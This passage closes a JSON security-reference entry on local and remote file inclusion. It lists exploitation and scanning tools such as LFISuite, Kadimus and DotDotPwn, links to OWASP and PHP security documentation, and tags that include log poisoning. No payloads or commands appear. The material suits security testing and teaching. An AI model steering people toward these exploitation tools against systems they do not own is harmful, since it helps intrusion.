REFERENCE:\n- **LFISuite**: https://github.com/D35m0nd142/LFISuite (LFI exploitation)\n- **LFI-RFI Scanner**: https://github.com/mzfr/lfi-rfi-scanner (Automated scanning)\n- **Kadimus**: https://github.com/P0cL4bs/Kadimus (LFI exploitation framework)\n- **Burp Suite**: https://portswigger.net/burp (Manual testing)\n- **DotDotPwn**: https://github.com/wireghoul/dotdotpwn (Directory traversal)\n\nFURTHER READING:\n- OWASP File Inclusion: https://owasp.org/www-community/attacks/Path_Traversal\n- PHP Wrappers: https://www.php.net/manual/en/wrappers.php\n- LFI/RFI Prevention: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html\n- Directory Traversal: https://owasp.org/www-community/attacks/Path_Traversal\n- PHP Security: https://www.php.net/manual/en/security.php",
      "tags": ["lfi", "rfi", "file-inclusion", "directory-traversal", "php-wrappers", "log-poisoning"]
    }
  ]
}
